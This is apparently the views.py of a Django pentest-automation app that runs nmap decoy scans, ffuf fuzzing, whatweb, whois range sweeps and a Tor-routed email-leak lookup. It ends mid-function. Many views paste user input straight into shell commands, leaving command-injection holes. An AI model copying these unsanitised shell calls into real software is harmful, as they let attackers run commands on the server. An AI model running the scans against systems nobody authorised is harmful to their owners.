import datetime
import ipaddress
import json
import subprocess

import requests
from django.contrib.auth.decorators import login_required
from django.http import HttpResponse, Http404, HttpResponseNotFound

from django.contrib.auth.models import User
from django.shortcuts import render, redirect

from django.contrib.auth import authenticate, login, logout
from django.contrib import messages
from django.db import models
from datetime import  datetime, timezone, timedelta



import time
import os
# Create your views here.



# Create your views here
#from core.models import Produto
from pymetasploit3.msfrpc import MsfRpcClient

from core.models import Scan, IP, Rede, FfufComandos, Diretorios, Porta, CVE_IP, CVE, SistemaOperacional, Sistema_IP, \
    Pentest_Rede, WhatWebComandos, WhatWeb, WhatWebIP, inetNum, dominioinetNum, Dominio, spfDominio, Emails, \
    SenhaMsfConsole, SubDominio, ExploitRodar, Exploit_Payload, QueryParameteres, SqlComandos


def login_user(request):
    return render(request,'login.html')


def registro(request):
    return render(request,'registro.html')



def logout_user(request):
    logout(request)
    return redirect('/')
def submit_login(request):
    if request.POST:
        username = request.POST.get('username')
        password = request.POST.get('password')
        usuario = authenticate(username=username,password=password)
        if usuario is not None:
            login(request,usuario)
            return redirect('/')
        else:
            messages.error(request,"Usuário ou senha invalido")


    return  redirect('/')

def submit_registro(request):
    print(request.POST)
    if request.POST:
        senha = request.POST.get('password')
        usuario = request.POST.get ( 'username' )
        email =   request.POST.get ( 'email' )
        try:
            print("e aqui?")
            user = User.objects.create_user ( str(usuario), str(email) ,  str(senha) )




        except:
            User.objects.get(usuario = usuario)
            User.objects.get(email = email)


            return HttpResponse('<h1> Usuario já cadastrado </h1>')

        print("hey")
        return redirect('/')
    return HttpResponse('<h1> faça um post </h1>')



@login_required(login_url='/login/')
def inicio(request,rede):
    usuario = User.objects.get(id=request.user.id)
    if rede == "WQFQWFUQWHFQWHFQWHFIWIF":
        try:
            rede = Pentest_Rede.objects.filter(usuario=usuario)[0].rede.rede
            print(rede)
            return redirect('/inicio/'+rede)
        except:
            return HttpResponse("crie uma rede associada a esse usuário")
    else:
        rede = requests.utils.unquote(rede)
        try:
            rede_objeto = Rede.objects.get(rede=rede)
        except:
            return  HttpResponse("Rede não existe")
        try:
            rede = Pentest_Rede.objects.get(rede=rede_objeto,usuario=usuario)
        except:
            return HttpResponse("crie um pentest para essa rede")

        ips_ativos = IP.objects.filter(ativo = 1,rede =rede_objeto )
        ips_desligados = IP.objects.filter(ativo = 0,rede = rede_objeto)
        diretorios = Diretorios.objects.filter(ip__rede = rede_objeto)
        print(diretorios)
        rede = Pentest_Rede.objects.filter(usuario=usuario)[0].rede.rede

        redes = Pentest_Rede.objects.filter(usuario=usuario)
        whatwebTotal =  WhatWebIP.objects.filter(ip__rede = rede_objeto)

        class PortasQuantidades:
            def __init__(self, ip, quantidade):
                self.ip = ip
                self.quantidade = quantidade

        portas_quantidades = []
        for ips_quantidade in ips_ativos:
            portas_quantidades.append(PortasQuantidades(ips_quantidade, len(Porta.objects.filter(ip=ips_quantidade))))



        dados = {'ips': ips_ativos,'ips_desligados':ips_desligados,'diretorios':diretorios,'rede':rede,'redes':redes,'whatwebTotal':whatwebTotal,'portas':Porta.objects.all(),'rede_vpn':rede_objeto,'portas_quantidades':portas_quantidades}
        return render(request,'inicio.html',dados)


@login_required(login_url='/login/')
def rede(request):
    return render(request,'rede.html')

def dataAtual():
    data_e_hora_atuais = datetime.now()
    diferenca = timedelta(hours=-3)
    fuso_horario = timezone(diferenca)
    data_e_hora_sao_paulo = data_e_hora_atuais.astimezone(fuso_horario)
    print(data_e_hora_sao_paulo)
    return str(data_e_hora_sao_paulo)



@login_required(login_url='/login/')
def scanOpcoes(request):
    ip = request.POST.get('ip')

    rede = request.POST.get('rede')
    rede_vpn = request.POST.get('rede_vpn')

    try:
        Pentest_Rede.objects.get(rede=Rede.objects.get(id=rede_vpn),usuario=User.objects.get(id=request.user.id))
    except:

        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")
    vpn = Rede.objects.get(id=rede_vpn)

    versao = request.POST.get('versao')
    tipo = request.POST.get('tipo')
    pn = request.POST.get('pn')
    so =  request.POST.get('so')
    portas =  request.POST.get('portas')
    vuln =  request.POST.get('vuln')

    porta_vai = ""
    numeros = ""
    print(portas)
    print("rede: "+rede)
    if portas == "":
        porta_vai = "-"
    else:
        porta_vai = porta_vai + " "
        for porta in portas:
            try:
                numero = int(porta)
                numeros = str(numeros) + str(porta)
            except:
                if numeros != "":
                    porta_vai = porta_vai + numeros + ","
                numeros = ""

        porta_vai = porta_vai + numeros
        try:
            int(porta_vai[-1:])
        except:
            porta_vai = porta_vai[:-1]

    print(porta_vai)
    if versao != "":
        versao = ' -sV '
    if pn != "":
        pn = ' -Pn '
    if so != "":
        so = ' -O '

    if vuln != "":
        vuln = ' -script=vuln '
    def get_Tipo(tipo):
        lugares_envio = {
            '1': '  ',
            '2': ' -sU ',
            '3': ' -sT ',

        }
        return lugares_envio.get(str(tipo), str(tipo))
    tipo = get_Tipo(tipo)

    OS = " -O"
    dataAgora = dataAtual().replace(' ','')
    ipstring = ip
    print(ip)
    ip = ip + "/" + str(rede)
    ip = ip.replace('\n', '')
    ip = ip.replace(' ', '')
    ip = ip.replace('\t', '')
    print(rede)
    print(ip)
    try:
        ip3 = ipaddress.ip_network(ipstring)

    except:
        return HttpResponse("IP ERRADO2" + str(ip))
    print(ip)

    #res = subprocess.check_output("", shell=True)
    print("aqui?")
    comando = "sudo nmap -D RND:20 "+str(versao)+ " " + str(tipo)+  " " +str(so) + " " +str(pn) + " -p" + str(porta_vai) + " " + str(ip) + " "+ str(vuln ) + " -oX arquivos/nmap/'" + str(dataAgora) + str(request.user) + "'.xml &"
    print("chegou aqui?")
    os.system(comando)


    usuario  = User.objects.get(id=request.user.id)
    vpn = Rede.objects.get(id=rede_vpn)
    ip = verificarSeExisteSeNaoCriar(ipstring,usuario,vpn)

    Scan.objects.create(ip = ip,
                        dataAgora = dataAgora,
                        usuario = User.objects.get(username= request.user),
                        feito = 0,
                        comando=comando,
                        )
    return redirect('/')

def xmlBancoVerificar():
    for scan in Scan.objects.filter(feito = 0):
        print(scan.usuario)
        verificarArquivoXml(scan.dataAgora,scan.usuario)



def verificarArquivoXml(dataAgora,usuario):
    try:
        res = subprocess.check_output("cat arquivos/nmap/" + str(dataAgora) + str(usuario) + ".xml", shell=True)
    except:
        print("alo")
    #print(res)
    try:
        lerArquivoXml(dataAgora,usuario)
        scan = Scan.objects.get(dataAgora = dataAgora,
                                        usuario = User.objects.get(username= usuario))
        scan.feito = 1
        scan.save()
    except:
        pass







def lerArquivoXml(dataAgora,usuario):
    import xml.etree.ElementTree as ET
    print(usuario)
    tree = ET.parse("arquivos/nmap/" + str(dataAgora) + str(usuario) + ".xml")
    root = tree.getroot()

    ip = []
    portas = []
    servicos = []
    produtos = []
    versoes = []
    sistemaoperacional_vai = []
    nomes_pegar_valores_nmap = ["name", "product", "version"]
    for child in root.findall("host"):
        for title in child.findall("address"):
                print(title.attrib)
                print(title.attrib['addr'])
                if title.attrib['addrtype'] == 'ipv4':
                    ip.append(title.attrib['addr'])

        for port in child.findall("ports"):
            porta = []
            servico = []
            produto = []
            versao = []
            for ports in port.findall("port"):
                print(ports.attrib['portid'])
                porta.append(ports.attrib['portid'])
                print(ports.text)
                for serviços in ports.findall("service"):
                    servico.append(serviços.attrib['name'])
                    try:
                        produto.append(serviços.attrib['product'])
                    except:
                        produto.append("Não existe")
                    try:

                        versao.append(float(serviços.attrib['version']))
                    except:
                        versao.append(0)

                # product
                # version

        portas.append(porta)
        servicos.append(servico)
        produtos.append(produto)
        versoes.append(versao)
        so = ""

        scan = Scan.objects.get(dataAgora=dataAgora,
                                usuario=User.objects.get(username=usuario))
        rede_vpn = scan.ip.rede

        for os in child.findall("os"):
            contador = 0
            for oss in os.findall("osmatch"):
                contador = contador + 1
                #verificarSeExisteSeNaoCriar(str(oss.attrib['name']), usuario,rede_vpn)
                print("alooooo")
                print(str(oss.attrib['name']))
                try:
                    try:
                        so2 = SistemaOperacional.objects.get(nome = IP.objects.get(ip = str(oss.attrib['name']),rede=rede_vpn))
                    except:
                        so2 = SistemaOperacional.objects.create(nome = IP.objects.get(ip = str(oss.attrib['name']),rede=rede_vpn))

                    if contador == 1:
                        try:
                            Sistema_IP.objects.get(ip=IP.objects.get(ip = str(oss.attrib['name']),rede=rede_vpn),
                                            )
                        except:
                            Sistema_IP.objects.create(ip=IP.objects.get(ip = str(oss.attrib['name']),rede=rede_vpn),
                                                  sistema=so2)
                except:
                    pass

        for os in child.findall("hostscript"):
            for oss in os.findall("script"):

                print("aqui2")
                print(oss.attrib['id'])
                for osss in oss.findall("table"):
                    print("aqui3")
                    print(str(title.attrib['addr']))
                    print(osss.attrib['key'])
                    try:
                        cve = CVE.objects.get(cve = str(osss.attrib['key']))
                    except:
                        cve = CVE.objects.create(cve = str(osss.attrib['key']))

                    try:
                        CVE_IP.objects.get(ip=IP.objects.get(ip = str(title.attrib['addr']),rede=rede_vpn),
                                           cve = cve)
                    except:
                        CVE_IP.objects.create(ip=IP.objects.get(ip = str(title.attrib['addr']),rede=rede_vpn),
                                           cve = cve)

    print(ip)
    print(portas)
    for i in range(len(ip)):
        print(ip[i])
        print("testeeeee")

        ipObjeto = IP.objects.get(ip=str(ip[i]),rede=rede_vpn,usuario=User.objects.get(username=usuario))

        ipObjeto.ativo = 1
        if True == ipaddress.ip_address(ip[i]).is_private:
                ipObjeto.redelocal = 1

        ipObjeto.save()


        contador = - 1
        for portaVariavel in portas[i]:
            try:
                portaIp = Porta.objects.get(porta=int(portaVariavel), ip=IP.objects.get(ip = str(ip[i]),rede=rede_vpn))
                Porta.objects.create(porta=int(portaVariavel),
                                     ip=ipObjeto,
                                     servico=servicos[i][contador],
                                     produto=produtos[i][contador],
                                     versao=versoes[i][contador],
                                     vulneravel=0,
                                     descricao="",
                                     tipo=0,
                                     ativo = 0)
                # portaIp = servicos[i][contador]
            except:

                contador = contador + 1
                Porta.objects.create(porta=int(portaVariavel),
                                     ip=ipObjeto,
                                     servico=servicos[i][contador],
                                     produto=produtos[i][contador],
                                     versao=versoes[i][contador],
                                     vulneravel=0,
                                     descricao="",
                                     tipo=0)
    portas = Porta.objects.all()
    scanFalta = verificarScan()
    dados = {"portas": portas, "ips": ip,
             "scans": scanFalta}

def verificarScan():
    return Scan.objects.filter(feito = 0)

def dirbBancoVerificar():

    try:
        scan = FfufComandos.objects.filter(feito = 2)
        for a in scan:
            verificarArquivoFfuf(a.dataAgora, a.usuario)

    except:
        scan = FfufComandos.objects.filter(feito=2)
        for a in scan:
            verificarArquivoFfuf(a.dataAgora, a.usuario)
        contador = 0
        for scan in FfufComandos.objects.filter(feito = 0):
            if contador == 0:
                contador = 1

                print(scan.usuario)
                os.system(scan.comando)
                scan.feito = 2
                scan.save()
            break


def sqlmapVerificar():

    try:
        scan = SqlComandos.objects.filter(feito = 2)
        for a in scan:
            verificarArquivoNmap(a.dataAgora, a.usuario)

    except:
        scan = SqlComandos.objects.filter(feito=2)
        for a in scan:
            verificarArquivoNmap(a.dataAgora, a.usuario)
        contador = 0
        for scan in SqlComandos.objects.filter(feito = 0):
            if contador == 0:
                contador = 1

                print(scan.usuario)
                os.system(scan.comando)
                scan.feito = 2
                scan.save()
            break

def WhatWebVerificar():

    try:
        scan = WhatWebComandos.objects.get(feito = 2)
        verificarArquivoWhatWeb(scan.arquivo,scan.diretorio.ip)
        scan.feito = 1
        scan.save()
    except:
        contador = 0
        for scan in WhatWebComandos.objects.filter(feito = 0):
            if contador == 0:
                contador = 1
                scan.feito = 2
                scan.save()
            break

def verificarArquivoNmap(dataAgora, usuario):
    from urllib.parse import urlparse
    teste = 1
    if teste == 1:
        print("entrei")
        target_file = "arquivos/ffuf/"  + str(usuario) + str(dataAgora)
        target_open = open(target_file, 'r',encoding = "ISO-8859-1")

        scan = FfufComandos.objects.get(dataAgora=dataAgora,
                                        usuario=User.objects.get(username=usuario))
        saida = subprocess.check_output(f'cat  {target_file} | grep "is vulnerable"',
                                        shell=True).decode("UTF-8")
        print(saida)


def verificarArquivoFfuf(dataAgora, usuario):
    from urllib.parse import urlparse
    teste = 1
    if teste == 1:
        print("entrei")
        target_file = "arquivos/ffuf/" + str(dataAgora) + str(usuario) + ".txt"
        target_open = open(target_file, 'r',encoding = "ISO-8859-1")

        scan = FfufComandos.objects.get(dataAgora=dataAgora,
                                        usuario=User.objects.get(username=usuario))
        teste = 0
        contador = 0
        for linha in target_open:

                if teste == 1:
                    valores = linha.split(',')
                    fuzz = valores[0]
                    url = valores[1]
                    print("url"  + url)
                    path = urlparse(url).path
                    httpcode = valores[4]
                    redirect_que_vai = valores[2]
                    if contador < 20:
                        if redirect_que_vai != "":
                            """
                            saida = subprocess.check_output(f'curl -i {redirect_que_vai}',
                                                                      shell=True).decode("UTF-8")
                            print(saida)
            
                            """
                            import requests
                            headers = {
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}

                            r = requests.get(redirect_que_vai, headers=headers)
                            print(r.url)
                            path = urlparse(r.url).path
                            httpcode = 200
                            contador = contador + 1

                    ip = scan.ip
                    porta = scan.porta
                    if redirect_que_vai != "":
                        path = urlparse(r.url).path
                    try:
                            path_filtrar = f'{path}'.split('?')[0]
                    except:
                            path_filtrar = path




                    diretorio = verificarSeExisteDiretorioSeNaoCriar(ip, porta, path_filtrar, httpcode, path)
                    alterarDiretoriosHttpCode(ip, porta, path_filtrar, httpcode, diretorio, path)

                if teste == 0:
                    teste = 1
        target_open.close()
        lerRobotstxt(ip,porta)
        lerSiteMap(ip,porta)
        scan.feito = 1
        scan.save()

def verificarSeExisteDiretorioSeNaoCriar(ip, porta, path_filtrar, httpcode, path):
    try:
        diretorio = Diretorios.objects.get(ip=ip, porta=porta, path=path_filtrar)


    except:

        diretorio = criarDiretorios(ip, porta, path_filtrar, httpcode, path)
    CriarOuPegarQueryParameteres(diretorio, path)
    return diretorio

def alterarDiretoriosHttpCode(ip,porta,path_filtrar,httpcode,diretorio,path):
    diretorio = Diretorios.objects.get(ip=ip, porta=porta, path=path_filtrar)
    diretorio.http_code = httpcode
    diretorio.save()
    return diretorio
def criarDiretorios(ip,porta,path_filtrar,httpcode,path):
    diretorio = Diretorios.objects.create(ip=ip, porta=porta, path=path_filtrar, http_code=httpcode)
    try:
        for name in path.split('?')[1].split('&'):
            print(name.split('=')[0])
            CriarOuPegarQueryParameteres(diretorio, name)

    except:
        return diretorio

    return diretorio

def CriarOuPegarQueryParameteres(diretorio,name):
    try:
        name = name.split('?')[1]
    except:
        pass
    try:
        try:
            query = QueryParameteres.objects.get(diretorio=diretorio, parametro=name.split('=')[0],
                                       )
        except:
            query = QueryParameteres.objects.create(diretorio=diretorio, parametro=name.split('=')[0],
                                            valor=name.split('=')[1])
    except:
        query = ""

    return query
def lerSiteMap(ip,porta):
    import requests
    from urllib.parse import urlparse
    ip_string = ip.ip
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}

    try:
        r = requests.get("http://"+ip_string + f':{porta}/sitemap.xml', headers=headers)
    except:
        r = requests.get("https://"+ip_string + f':{porta}/sitemap.xml', headers=headers)
    import xml.etree.ElementTree as ET
    try:
        root = ET.fromstring(r.content.decode("utf-8"))
        for child in root:
            for subelem in child:
                path = urlparse(subelem.text).path
                try:
                    try:
                        r2 = requests.get(f'http://{ip_string}:{porta}{path}', headers=headers)
                    except:
                        r2 = requests.get(f'https://{ip_string}:{porta}{path}', headers=headers)

                except:
                    continue
                httpcode = r2.status_code
                try:
                    path_filtrar = f'{path}'.split('?'[0])
                except:
                    path_filtrar = path

                diretorio = verificarSeExisteDiretorioSeNaoCriar(ip, porta, path_filtrar, httpcode, path)
                alterarDiretoriosHttpCode(ip, porta, path_filtrar, httpcode, diretorio, path)
    except:
        pass



def lerRobotstxt(ip,porta):
    ip_string = ip.ip
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
    try:
        r = requests.get("http://"+ip_string + f':{porta}/robots.txt', headers=headers)
    except:
        r = requests.get("https://"+ip_string + f':{porta}/robots.txt', headers=headers)

    print(r.content.decode("utf-8"))
    for a in r.content.decode("utf-8").split('\n'):
        if "Disallow" in a or 'Allow' in a:
            print("está")
            path = a.split(':')[1]
            print(path)
            path = requests.utils.unquote(path).strip()
            try:
                r2 = requests.get(f'https://{ip_string}:{porta}{path}', headers=headers)
            except:
                r2 = requests.get(f'http://{ip_string}:{porta}{path}', headers=headers)

            httpcode = r2.status_code
            try:
                path_filtrar = f'{path}'.split('?'[0])
            except:
                path_filtrar= path

            diretorio = verificarSeExisteDiretorioSeNaoCriar(ip, porta, path_filtrar, httpcode, path)
            alterarDiretoriosHttpCode(ip, porta, path_filtrar, httpcode, diretorio, path)





def dirbOpcoes(request):


    ip = request.POST.get('ip')
    rede = request.POST.get('rede')
    path = request.POST.get('path')
    user_agent = request.POST.get('user_agent')
    extencao = request.POST.get('extencao')
    portas =  request.POST.get('portas')
    https =  request.POST.get('https')
    wordlist =  request.POST.get('wordlist')

    path_vai = ""
    user_agent_vai = ""
    extencao_vai = ""



    if str(path) != "":
        path_vai = path


    if str(user_agent) != "":
        user_agent_vai = f' -a "{user_agent}" '
    if str(extencao) != "":
        extencao_vai = f' -e {extencao} '

    if portas == "":
        porta_vai = ['']
    else:
        porta_vai = portas.split(',')

    print(porta_vai)



    if str(https) == "option2":
        https_vai = 'https://'
    else:
        https_vai = 'http://'

    print(https)


    dataAgora = dataAtual().replace(' ','')
    ipstring = ip
    print(ip)
    ip = ip + "/" + str(rede)
    ip = ip.replace('\n', '')
    ip = ip.replace(' ', '')
    ip = ip.replace('\t', '')
    print(rede)
    print(ip)
    try:
        ip3 = ipaddress.ip_network(ipstring)
    except:
        return HttpResponse("IP ERRADO2" + str(ip))
    print("alo")
    print(ip)
    #res = subprocess.check_output("", shell=True)
    print("aqui?")
    usuario = User.objects.get(username= request.user)
    rede_vpn = request.POST.get('rede_vpn')
    try:
        Pentest_Rede.objects.get(rede=Rede.objects.get(id=rede_vpn),usuario=usuario)
    except:
        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")
    for ipinho in ipaddress.IPv4Network(ip,False):

        for portinha in porta_vai:
            dataAgora = dataAtual().replace(' ', '')
            comando = f'ffuf  -c -w {wordlist} -u {https_vai}{ipinho}:{portinha}{path_vai}FUZZ   ' + ' -o  arquivos/ffuf/' + str(dataAgora) + str(request.user) + f'.txt -of csv  {extencao_vai} &'
            print(comando)
            print(dataAgora)
            #os.system(comando)
            ip_que_vai = verificarSeExisteSeNaoCriar(ipinho,usuario,Rede.objects.get(id=rede_vpn))
            CriarFfufComandos(ip_que_vai,dataAgora,usuario,comando,porta= portinha)

    return redirect('/')

def CriarFfufComandos(ip,dataAgora,usuario,comando,porta):
    FfufComandos.objects.create(ip=ip,
                                dataAgora=dataAgora,
                                usuario=usuario,
                                comando=comando,
                                porta=porta)

def verificarSeExisteSeNaoCriar(ip,usuario,rede):
    try:
        ip_que_vai = IP.objects.get(ip=ip,
                                    usuario=usuario,
                                    rede=rede)
    except:
        ip_que_vai = IP.objects.create(ip=ip,
                                       usuario=usuario,
                                       rede=rede)
    return ip_que_vai

@login_required(login_url='/login/')
def whatweb(request,id):

        Pentest_Rede.objects.get( rede=Diretorios.objects.get(id=id).ip.rede,usuario=User.objects.get(id=request.user.id))
        data_Agora = dataAtual()
        ip = Diretorios.objects.get(id=id).ip
        porta = Diretorios.objects.get(id=id).porta
        path = Diretorios.objects.get(id=id).path
        res = os.system(f'whatweb {ip}:{porta}{path} '+   "--log-json=arquivos/whatweb/'whatweb"+data_Agora+"'")
        comando = f'whatweb {ip}:{porta}{path} '+   "--log-json=arquivos/whatweb/'whatweb"+data_Agora+"'"
        WhatWebComandos.objects.create(diretorio = Diretorios.objects.get(id=id),arquivo = "arquivos/whatweb/whatweb"+data_Agora)

        return redirect('/inicio/')
def verificarArquivoWhatWeb(arquivo,ip):
    with open(arquivo) as file:
        jsonsaida = json.load(file)


    for jsonzinho in jsonsaida:
        print("aqui")
        print(jsonzinho)
        for b in jsonzinho['plugins']:
            # print(jsonzinho['plugins'][b])
            for c in jsonzinho['plugins'][b]:
                try:
                    whatwebtitulo = WhatWeb.objects.get(Titulo =str(b))
                except:
                    whatwebtitulo = WhatWeb.objects.create(Titulo =str(b))

                try:
                    WhatWebIP.objects.get(whatweb=whatwebtitulo,
                                          nome = c,
                                          valor = jsonzinho['plugins'][b][c][0],
                                          ip = ip)
                except:
                    WhatWebIP.objects.create(whatweb=whatwebtitulo,
                                          nome=c,
                                          valor=jsonzinho['plugins'][b][c][0],
                                          ip=ip)

                print(c)




def blocoIP(ip):
    dataAgora = dataAtual()
    res = subprocess.check_output(' whois ' + str(ip)  + ' | grep "inetnum" | cut -d ":" -f2 |  cut -d "-" -f1',
                                  shell=True)
    print(res.decode("UTF-8").replace(' ',''))
    ipminimo = res.decode("UTF-8").replace(' ','')

    res = subprocess.check_output(' whois ' + str(ip) + ' | grep "inetnum" | cut -d ":" -f2 |  cut -d "-" -f2',
                                  shell=True)
    print(res.decode("UTF-8").replace(' ',''))
    ipmaximo = res.decode("UTF-8").replace(' ','')

    ipminimo = ipminimo.replace('\n', '')
    ipmaximo = ipmaximo.replace('\n', '')
    return ipminimo,ipmaximo


def scanredelocalip(request, ip, vpn):

    try:
        Pentest_Rede.objects.get(rede=vpn,usuario=User.objects.get(id=request.user.id))
    except:
        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")


    dataAgora = dataAtual()
    comando = "sudo nmap -Pn -D RND:20 " + ip + " -oX arquivos/nmap/'"+ str(dataAgora) + str(request.user) + "'.xml &"
    os.system(comando)

    usuario = User.objects.get(id=request.user.id)
    ip = verificarSeExisteSeNaoCriar(ip, usuario, vpn)

    Scan.objects.create(ip=ip,
                        dataAgora=dataAgora,
                        usuario=User.objects.get(username=request.user),
                        feito=0,
                        comando=comando,
                        )


def publicoDominio(request,dominio,rede_vpn):
    if dominio != "the":
        dominio = dominio
    else:
        dominio = request.POST.get('dominio')
    vpn = Rede.objects.get(id=rede_vpn)

    res = subprocess.check_output('host -t A '+   str(dominio) + ' | cut -d " " -f4', shell=True)
    res = res.decode("UTF-8").replace(' ', '')
    res = res.replace('\n', '')

    print(res)
    ipminimo, ipmaximo = blocoIP(res)
    ipminimoVai = ipminimo.replace('\n','')
    ipmaximoVai = ipmaximo.replace('\n','')

    if ipmaximo == "":
        pass
    else:
            print("etrou")

            print(ipminimo)

            ip = ipaddress.IPv4Address(ipminimoVai)
            print(ip)
            print("aquiiiii")
            print(ipmaximoVai)
            while ipaddress.IPv4Address(ip) != ipaddress.IPv4Address(ipmaximoVai) + 1:
                scanredelocalip(request, str(ip),vpn)

                try:
                    ip2 = IP.objects.get(ip=str(ip),rede=vpn)
                except:
                    if ipaddress.ip_address(ip).is_private == True:
                        redelocal = 1
                    else:
                        redelocal = 0
                    ip2 = IP.objects.create(ip=str(ip),
                                                 usuario=User(request.user.id),
                                                 ativo=0,
                                            redelocal = redelocal,
                                             rede = vpn
                                          )
                ip = ip + 1

    ipminimo = ipminimoVai
    ipmaximo = ipmaximoVai

    ipObjetomin = IP.objects.get(ip=ipminimo,rede=vpn)
    ipObjetomax = IP.objects.get(ip=ipmaximo,rede=vpn)


    try:
        Dominio.objects.get(nome=dominio,ip__rede=vpn).nome

    except:
        scanredelocalip(request.user, res, vpn)
        ipObjeto = IP.objects.get(ip = res,rede=vpn)

        Dominio.objects.create(nome = dominio,
                                ip = ipObjeto,
                              )


    try:


        inet = inetNum.objects.get(ipMinimo_ip = ipObjetomin, ipMaximo_ip=ipObjetomax)
    except:
        inet = inetNum.objects.create(ipMinimo_ip=ipObjetomin, ipMaximo_ip=ipObjetomax)

    try:
        dominioinetNum.objects.get(Dominio = Dominio.objects.get(nome = dominio,ip__rede=vpn))
    except:
        dominioinetNum.objects.create(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn),bloco=inet)

    #Dominio = models.ForeignKey(Dominio, models.CASCADE)
    #bloco = models.ForeignKey(inetNum, models.CASCADE)



    try:
        Dominio.objects.get(nome=dominio,ip__rede=vpn).nome

    except:
        scanredelocalip(request.user, res, vpn)
        ipObjeto = IP.objects.get(ip = res,rede=vpn)

        Dominio.objects.create(nome = dominio,
                                ip = ipObjeto,
                              )
    try:
        spf = spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
        vulneravelSpf = spf.vulneravel
        descricaoSpf  = spf.descricao
    except:
        vulneravelSpf = "Ainda não sabemos"
        descricaoSpf = "Não tem descrição"

    try:
        emails = Emails.objects.filter(Dominio = Dominio.objects.get(nome=dominio,ip__rede=vpn))

        res2 = subprocess.check_output("sudo service tor start", shell=True)
        try:
            res2 = subprocess.check_output("sudo python3 /opt/karma/karma-master/bin/karma.py target -o arquivos/publico/email/"+str(dominio), shell=True)
            res2 = res2.decode("UTF-8").replace(' ', '')
            res2 = res2.replace('\n', '')
            print(res2)
        except:
            res2 = "Karma não encontrado"

    except:
        emails = ""
    dados  = { "dominio": Dominio.objects.get(nome = dominio,ip__rede=vpn).nome,
               "ip":IP.objects.get(ip = res,rede=vpn).ip,
               "spf": vulneravelSpf,
               "descricao": descricaoSpf,
               "emails": emails,
               "scans": verificarScan()
               }

    return render(request,'dominio.html',dados)


def verDominio(request,dominio,rede):
    usuario = User.objects.get(id=request.user.id)

    if rede == "WQFQWFUQWHFQWHFQWHFIWIF":
        try:
            rede = Pentest_Rede.objects.filter(usuario=usuario)[0].rede.rede
            print(rede)
            return redirect(rede)
        except:
            return HttpResponse("crie uma rede associada a esse usuário")
    else:
        rede = requests.utils.unquote(rede)
        try:
            vpn = Rede.objects.get(rede=rede)
        except:
            return  HttpResponse("Rede não existe")
        try:
            rede = Pentest_Rede.objects.get(rede=vpn,usuario=usuario)
        except:
            return HttpResponse("crie um pentest para essa rede")

    try:
        spf = spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
        vulneravelSpf = spf.vulneravel
        descricaoSpf  = spf.descricao
    except:
        vulneravelSpf = "Ainda não sabemos"
        descricaoSpf = "Não tem descrição"
    try:
        emails = Emails.objects.filter(Dominio = Dominio.objects.get(nome=dominio,ip__rede=vpn))
    except:
        emails = ""

    bloco = dominioinetNum.objects.get(Dominio=Dominio.objects.get(nome=dominio, ip__rede=vpn)).bloco
    ipminimo = bloco.ipMinimo_ip.ip
    ipmaximo = bloco.ipMaximo_ip.ip

    ips_vetor = []
    ip = ipaddress.IPv4Address(ipminimo)
    print(ip)
    print("aquiiiii")
    while ipaddress.IPv4Address(ip) != ipaddress.IPv4Address(ipmaximo) + 1:
        ip_objeto = IP.objects.get(ip=ip,rede=vpn)
        if ip_objeto.ativo == 1:
            ips_vetor.append(ip_objeto)
        ip = ip + 1

    ips_ativos = ips_vetor

    class PortasQuantidades:
        def __init__(self,ip,quantidade):
            self.ip =  ip
            self.quantidade = quantidade
    portas_quantidades = []
    for ips_quantidade in ips_ativos:
        portas_quantidades.append(PortasQuantidades(ips_quantidade,len(Porta.objects.filter(ip=ips_quantidade))))


    portas = Porta.objects.all()

    rede = Pentest_Rede.objects.filter(usuario=usuario)[0].rede.rede
    diretorios = Diretorios.objects.filter(ip__rede=vpn)

    redes = Pentest_Rede.objects.filter(usuario=usuario)
    dados = {
    "dominio": Dominio.objects.get(nome=dominio, ip__rede=vpn).nome,
    "ip_dominio": Dominio.objects.get(nome=dominio, ip__rede=vpn).ip,
    "spf": vulneravelSpf,
    "descricao": descricaoSpf,
    "emails": emails,
        "portas":portas,
        "ips":ips_ativos,'diretorios':diretorios,'rede':rede,'redes':redes,
        "subdominios":SubDominio.objects.filter(Dominio = Dominio.objects.get(nome=dominio, ip__rede=vpn)),
        "portas_quantidades":portas_quantidades

    }

    return render(request,'dominio.html',dados)


def SPF(request,dominio,rede_vpn):
    dataAgora = dataAtual()
    vpn = Rede.objects.get(id=rede_vpn)

    try:
        Pentest_Rede.objects.get(rede=Rede.objects.get(id=rede_vpn),usuario=User.objects.get(id=request.user.id))
    except:
        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")
    res = subprocess.check_output("host -t txt " + str(dominio) + " | grep '?all'", shell=True)
    res = res.decode("UTF-8").replace(' ','')
    print(res)
    print("aqui0")
    try:
        spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
    except:

        if res == "":
            res = subprocess.check_output("host -t txt " + str(dominio) + " | grep '~all'", shell=True)
            res = res.decode("UTF-8").replace(' ', '')
            print(res)
            print("aqui")

            if res == "":
                print(res)
                print("aqui3")

                try:
                    spf = spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
                    spf.vulneravel = 2
                    spf.descricao = res
                    spf.save()
                except:
                    spfDominio.objects.create(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn),
                                          vulneravel=2,
                                          descricao=res)



            else:
                print(res)
                print("aqui4")
                try:
                    spf = spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
                    spf.vulneravel = 1
                    spf.descricao = res
                    spf.save()
                except:
                    spfDominio.objects.create(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn),
                                              vulneravel=1,
                                              descricao=res)


        else:
            try:
                spf = spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
